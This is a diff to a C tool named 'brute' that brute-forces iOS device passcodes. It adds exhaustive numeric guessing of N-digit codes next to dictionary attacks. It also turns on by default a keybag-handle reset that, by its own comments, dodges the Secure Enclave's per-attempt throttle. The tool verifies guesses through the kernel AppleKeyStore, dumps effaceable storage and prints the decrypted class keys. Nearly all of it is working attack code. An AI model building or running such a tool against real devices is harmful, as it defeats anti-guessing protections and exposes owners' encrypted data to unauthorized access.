@@ -14,7 +14,12 @@
 //   -k        kernel AppleKeyStore user client, selectors identical to
 //             non-SEP devices; the (alive) SEP executes underneath
 //
-// Usage: brute [-k] [-r N] <dictionary_file> [keybag_path]
+// Usage: brute -n <digits> [options]         numeric 0000..10^n-1
+//        brute -k <dict_file> [options]      dictionary (mixed passcodes)
+//        brute -K <passcode> [keybag_path]   single candidate test
+//        brute -D                            dump effaceable storage
+// Options: -u userland verification, --disable-keybag-reset,
+//          --keybag-reset-time N (default 5; reset is ON by default)
 
 #include <CommonCrypto/CommonCryptor.h>
 #include <CoreFoundation/CoreFoundation.h>
@@ -639,6 +644,33 @@ static int verify_passcode(KeyBag *scratch, const uint8_t passcode_key[32]) {
     return 1;
 }
 
+// ---------------------------------------------------------- candidate source
+
+// Produces the next candidate passcode: either all N-digit numbers
+// (0000..10^N-1, zero-padded) or lines of a dictionary file.
+typedef struct {
+    int digits;          // >0: numeric generator mode
+    uint64_t next, total;
+    FILE *dict;          // dictionary mode
+    char buf[256];
+} CandSrc;
+
+static int cand_next(CandSrc *c, char *out, size_t outsz) {
+    if (c->digits > 0) {
+        if (c->next >= c->total) return 0;
+        snprintf(out, outsz, "%0*llu", c->digits, (unsigned long long)c->next++);
+        return 1;
+    }
+    while (fgets(c->buf, sizeof(c->buf), c->dict)) {
+        size_t n = strlen(c->buf);
+        while (n && (c->buf[n-1] == '\n' || c->buf[n-1] == '\r')) c->buf[--n] = 0;
+        if (!n) continue;
+        strlcpy(out, c->buf, outsz);
+        return 1;
+    }
+    return 0;
+}
+
 // ---------------------------------------------------------- kext/SEP path
 
 // "Like a non-SEP device" invocation: the AppleKeyStore user client selectors
@@ -688,11 +720,11 @@ static kern_return_t ks_unlock(const char *passcode, size_t len) {
                                passcode, len, NULL, NULL, NULL, NULL);
 }
 
-// Try every dictionary entry through the kernel AppleKeyStore. reset_every > 0
-// rebuilds the keybag handle + user client connection every N consecutive
-// failures to dodge the SEP's ~5s-per-attempt throttle. Returns the winning
-// passcode via found_passcode, 0 on success.
-static int kext_brute(const char *dict_path, CFDataRef kbdata, int reset_every,
+// Run every candidate through the kernel AppleKeyStore. reset_every > 0
+// (default) rebuilds the keybag handle + user client connection every N
+// consecutive failures to dodge the SEP's ~5s-per-attempt throttle.
+// Returns the winning passcode via found_passcode, 0 on success.
+static int kext_brute(CandSrc *cand, CFDataRef kbdata, int reset_every,
                       char *found_passcode, size_t found_sz) {
     uint64_t keybag_id = 0;
     kern_return_t kr = ks_setup(kbdata, &keybag_id);
@@ -700,26 +732,22 @@ static int kext_brute(const char *dict_path, CFDataRef kbdata, int reset_every,
            (unsigned long long)keybag_id, reset_every);
     if (kr != KERN_SUCCESS) return kr;
 
-    FILE *dict = fopen(dict_path, "r");
-    if (!dict) {
-        fprintf(stderr, "[-] cannot open dictionary %s\n", dict_path);
-        return -1;
+    if (cand->digits > 0) {
+        printf("[i] numeric mode: %llu candidates (%d digits)\n",
+               (unsigned long long)cand->total, cand->digits);
     }
+
     char line[256];
     int index = 0, fails = 0, resets = 0;
     double t_all = now_ms();
-    while (fgets(line, sizeof(line), dict)) {
-        size_t n = strlen(line);
-        while (n && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = 0;
-        if (!n) continue;
+    while (cand_next(cand, line, sizeof(line))) {
         index++;
         double t0 = now_ms();
-        kr = ks_unlock(line, n);
+        kr = ks_unlock(line, strlen(line));
         printf("[%d] \"%s\" -> rc=0x%08x %s (%.1f ms)\n", index, line, kr,
                kr == KERN_SUCCESS ? "*** FOUND ***" : "", now_ms() - t0);
         if (kr == KERN_SUCCESS) {
             strlcpy(found_passcode, line, found_sz);
-            fclose(dict);
             printf("[i] %d candidates, %d handle resets in %.1f ms "
                    "(%.1f ms each avg)\n", index, resets, now_ms() - t_all,
                    (now_ms() - t_all) / index);
@@ -736,13 +764,11 @@ static int kext_brute(const char *dict_path, CFDataRef kbdata, int reset_every,
             resets++;
             if (kr != KERN_SUCCESS) {
                 fprintf(stderr, "[-] kext re-setup failed: 0x%08x\n", kr);
-                fclose(dict);
                 return kr;
             }
             fails = 0;
         }
     }
-    fclose(dict);
     printf("[i] %d candidates, %d handle resets in %.1f ms\n", index, resets,
            now_ms() - t_all);
     return 1;
@@ -751,41 +777,64 @@ static int kext_brute(const char *dict_path, CFDataRef kbdata, int reset_every,
 // ---------------------------------------------------------- main
 
 int main(int argc, char **argv) {
-    int mode_kext = 0;
-    const char *single = NULL;
-
     if (argc >= 2 && strcmp(argv[1], "-D") == 0)
         return dump_mode();
-    int argi = 1;
-    if (argc >= 3 && strcmp(argv[1], "-k") == 0) { // kext/SEP dictionary mode
-        mode_kext = 1;
-        argi = 2;
-    } else if (argc >= 3 && strcmp(argv[1], "-K") == 0) { // single kext test
-        mode_kext = 1;
-        single = argv[2];
-        argi = 3;
+
+    int digits = 0;            // -n N: numeric mode
+    const char *dict_path = NULL; // -k FILE: dictionary mode (mixed passcodes)
+    int userland = 0;          // -u: userland tangle verification (pre-A7)
+    const char *single = NULL; // -K PASS: single candidate test
+    int reset_every = 5;       // keybag handle reset ON by default
+    const char *kb_path = "/mnt2/keybags/systembag.kb";
+    int kb_set = 0;
+
+    for (int argi = 1; argi < argc; argi++) {
+        const char *a = argv[argi];
+        if (strcmp(a, "-D") == 0) {
+            return dump_mode();
+        } else if (strcmp(a, "-n") == 0 && argi + 1 < argc) {
+            digits = atoi(argv[++argi]);
+            if (digits < 1 || digits > 10) {
+                fprintf(stderr, "[-] -n expects 1..10 digits\n");
+                return 2;
+            }
+        } else if (strcmp(a, "-k") == 0 && argi + 1 < argc) {
+            dict_path = argv[++argi];
+        } else if (strcmp(a, "-u") == 0) {
+            userland = 1;
+        } else if (strcmp(a, "-K") == 0 && argi + 1 < argc) {
+            single = argv[++argi];
+        } else if (strcmp(a, "--disable-keybag-reset") == 0) {
+            reset_every = 0;
+        } else if (strcmp(a, "--keybag-reset-time") == 0 && argi + 1 < argc) {
+            reset_every = atoi(argv[++argi]);
+        } else if (strcmp(a, "-r") == 0 && argi + 1 < argc) {
+            reset_every = atoi(argv[++argi]); // alias
+        } else if (a[0] != '-' && !kb_set) {
+            kb_path = a;
+            kb_set = 1;
+        } else {
+            fprintf(stderr,
+                "usage: %s -n <digits> [options]        # numeric 0000..10^n-1\n"
+                "       %s -k <dict_file> [options]     # dictionary (mixed passcodes)\n"
+                "       %s -K <passcode> [keybag_path]  # single candidate test\n"
+                "       %s -D                            # dump effaceable bytes\n"
+                "options:\n"
+                "  -u                        userland tangle verification (pre-A7 research path)\n"
+                "  --disable-keybag-reset    turn OFF the throttle dodge (default: on, every 5 fails)\n"
+                "  --keybag-reset-time N     rebuild keybag handle every N failures (default 5)\n"
+                "  keybag_path               positional, default /mnt2/keybags/systembag.kb\n"
+                "verification defaults to the kernel AppleKeyStore (SEP-backed);\n"
+                "a hit prints *** FOUND *** and exits 0.\n",
+                argv[0], argv[0], argv[0], argv[0]);
+            return 2;
+        }
     }
-    int reset_every = 0;
-    if (argi < argc && strcmp(argv[argi], "-r") == 0 && argi + 1 < argc) {
-        reset_every = atoi(argv[argi + 1]); // rebuild keybag handle every N fails
-        argi += 2;
-    }
-    if ((!single && argc < argi + 1)) {
-        fprintf(stderr,
-                "usage: %s [-k] [-r N] <dictionary_file> [keybag_path]\n"
-                "       %s -K <passcode> [keybag_path]\n"
-                "       %s -D   (dump effaceable bytes)\n"
-                "  default keybag: /mnt2/keybags/systembag.kb\n"
-                "  default mode: userland tangle (non-SEP style)\n"
-                "  -k: kernel AppleKeyStore path (SEP-backed, non-SEP API)\n"
-                "  -r N: rebuild keybag handle+connection every N failures\n"
-                "        (dodges the ~5s SEP throttle; try N=5)\n",
-                argv[0], argv[0], argv[0]);
+
+    if (!digits && !dict_path && !single) {
+        fprintf(stderr, "[-] nothing to do: give -n <digits>, -k <dict_file> or -K <passcode>\n");
         return 2;
     }
-    const char *dict_path = single ? NULL : argv[argi];
-    const char *kb_path = argc > argi + 1 ? argv[argi + 1]
-                       : (single && argc > 3 ? argv[3] : "/mnt2/keybags/systembag.kb");
 
     setvbuf(stdout, NULL, _IOLBF, 0);
 
@@ -847,8 +896,23 @@ int main(int argc, char **argv) {
     }
     printf("[+] %d passcode-wrapped (wrap&2) keys -> verifiable\n", wrap2);
 
-    if (mode_kext) {
-        char found[256] = {0};
+    // candidate source: -K single, -n digits, or -k dictionary
+    CandSrc cand;
+    memset(&cand, 0, sizeof(cand));
+    if (digits > 0) {
+        cand.digits = digits;
+        cand.total = 1;
+        for (int i = 0; i < digits; i++) cand.total *= 10;
+    } else if (dict_path) {
+        cand.dict = fopen(dict_path, "r");
+        if (!cand.dict) {
+            fprintf(stderr, "[-] cannot open dictionary %s\n", dict_path);
+            return 2;
+        }
+    }
+
+    if (!userland) {
+        // kernel AppleKeyStore verification (default; SEP executes underneath)
         if (single) {
             g_ks_conn = open_service("AppleKeyStore");
             if (!g_ks_conn) return 7;
@@ -867,21 +931,18 @@ int main(int argc, char **argv) {
                    now_ms() - t0);
             return kr == KERN_SUCCESS ? 0 : 1;
         }
-        int r = kext_brute(dict_path, kbdata, reset_every, found, sizeof(found));
+        char found[256] = {0};
+        int r = kext_brute(&cand, kbdata, reset_every, found, sizeof(found));
+        if (cand.dict) fclose(cand.dict);
         if (r == 0) {
             printf("=== PASSCODE FOUND: %s ===\n", found);
             return 0;
         }
-        printf("=== passcode not in dictionary (kext mode, rc=%d) ===\n", r);
+        printf("=== passcode not found (kext mode, rc=%d) ===\n", r);
         return 1;
     }
 
-    FILE *dict = fopen(dict_path, "r");
-    if (!dict) {
-        fprintf(stderr, "[-] cannot open dictionary %s\n", dict_path);
-        return 2;
-    }
-
+    // userland tangle verification (pre-A7 research path)
     char line[256];
     char found_passcode[256] = {0};
     uint8_t passcode_key[32];
@@ -889,16 +950,13 @@ int main(int argc, char **argv) {
     int index = 0, found = 0;
     double t_all = now_ms();
 
-    while (fgets(line, sizeof(line), dict)) {
-        size_t n = strlen(line);
-        while (n && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = 0;
-        if (!n) continue;
+    while (single ? (index == 0 ? strlcpy(line, single, sizeof(line)), 1 : 0)
+                  : cand_next(&cand, line, sizeof(line))) {
         index++;
         double t0 = now_ms();
-        if (derive_passcode_key(kb, passcode_key, line, n) != 0) {
+        if (derive_passcode_key(kb, passcode_key, line, strlen(line)) != 0) {
             fprintf(stderr, "[-] derivation failed on \"%s\"\n", line);
-            fclose(dict);
-            return 6;
+            break;
         }
         memcpy(&scratch, kb, sizeof(scratch));
         int ok = verify_passcode(&scratch, passcode_key);
@@ -910,12 +968,10 @@ int main(int argc, char **argv) {
             break;
         }
     }
-    fclose(dict);
+    if (cand.dict) fclose(cand.dict);
 
     double total = now_ms() - t_all;
-    printf("[i] %d candidates in %.1f ms\n", index, total);
-
-    if (found) {
+    printf("[i] %d candidates in %.1f ms\n", index, total);    if (found) {
         printf("=== PASSCODE FOUND: %s ===\n", found_passcode);
         hex("[+] passcodeKey", passcode_key, 32);
         printf("class keys (wrap&2 unwrapped; wrap&1 decrypted with key835):\n");
